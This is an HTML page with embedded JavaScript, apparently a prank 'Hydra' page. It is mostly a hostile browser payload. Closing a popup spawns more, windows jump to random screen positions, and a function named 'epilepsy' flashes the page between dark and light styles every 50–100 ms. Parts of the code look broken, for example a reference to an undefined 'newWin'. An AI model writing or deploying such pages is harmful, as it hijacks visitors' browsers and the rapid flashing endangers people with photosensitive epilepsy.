<body mouseover="init()" onclick="init()" onload="init()">
    <iframe onload="init()" src="./" style="display: none;"></iframe>
    <div class="icon" mouseover="init()" onclick="init()" onload="init()">We Are The Hydra. Cut Off A Head, Three More Appears.<br>Drag this into your bookmarks bar to get your Hydra pet: <a href="javascript:window.open('//minecraftpublisher.github.io/TheHydra');void(0);">TheHydra</a></div>
    <script>
        (function() {
  var hidden = "hidden";

  // Standards:
  if (hidden in document)
    document.addEventListener("visibilitychange", onchange);
  else if ((hidden = "mozHidden") in document)
    document.addEventListener("mozvisibilitychange", onchange);
  else if ((hidden = "webkitHidden") in document)
    document.addEventListener("webkitvisibilitychange", onchange);
  else if ((hidden = "msHidden") in document)
    document.addEventListener("msvisibilitychange", onchange);
  // IE 9 and lower:
  else if ("onfocusin" in document)
    document.onfocusin = document.onfocusout = onchange;
  // All others:
  else
    window.onpageshow = window.onpagehide
    = window.onfocus = window.onblur = onchange;

  function onchange (evt) {
    var v = "visible", h = "hidden",
        evtMap = {
          focus:v, focusin:v, pageshow:v, blur:h, focusout:h, pagehide:h
        };

    evt = evt || window.event;
    if (evt.type in evtMap)
      document.body.className = evtMap[evt.type]
    else
      init()
  }

  // set the initial state (but only if browser supports the Page Visibility API)
  if( document[hidden] !== undefined )
    onchange({type: document[hidden] ? "blur" : "focus"})
})();
        
        window.plsclose = 'no'
        window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
        
        function interval() {
            const damnson = setInterval(() => {
                window.moveTo(Math.floor(Math.random() * screen.availWidth), Math.floor(Math.random() * screen.availHeight))
                if(window.opener === null) {
                    clearInterval(damnson)
                    openNew('safe')
                }
            }, 500)
        }
        
        function epilepsy() {
            let styles = document.querySelector('.style').setAttribute
            
            setInterval(() => {
                styles('https://cdn.jsdelivr.net/npm/water.css@2/out/dark.css')
                setTimeout(() => {
                    styles('https://cdn.jsdelivr.net/npm/water.css@2/out/light.css')
                }, 50)
            }, 100)
        }
        
        function openNew(input,purpose) {
            // Main popup loader
            var popup = window.open(window.location.href + '?popup=' + input, '', 'top=' + Math.floor(Math.random() * screen.availHeight) + ',left=' + Math.floor(Math.random() * screen.availWidth) + ',width=350,height=250')
            if(!newWin || newWin.closed || typeof newWin.closed=='undefined') {
                // Produces tab versions until a popup is allowed.
                popup = window.open(window.location.href + '?popup=safe', '_blank')
            }
            
            popup.window.alert(purpose)
            // Check if a popup is closed, And then load up a new set of heads if it is.
            var popupTick = setInterval(function () {
                if (popup.closed) {
                    clearInterval(popupTick);
                    if (window.plsclose == "no") {
                        openNew('safe')
                    }
                }
            }, 100)

            return false
        }
        
        // Check the state of the window.
        function init(purpose) {
            epilepsy()
            if (window.clone === 'main') {
                openNew('safe', purpose)
            } else if (window.clone === 'safe') {
                interval()
                openNew('popup', purpose)
                openNew('popup', purpose)
            } else {
                interval()
            }
        }
    </script>
    <style>
        body {
            display: grid;
            place-items: center;
            text-align: center;
        }
    </style>
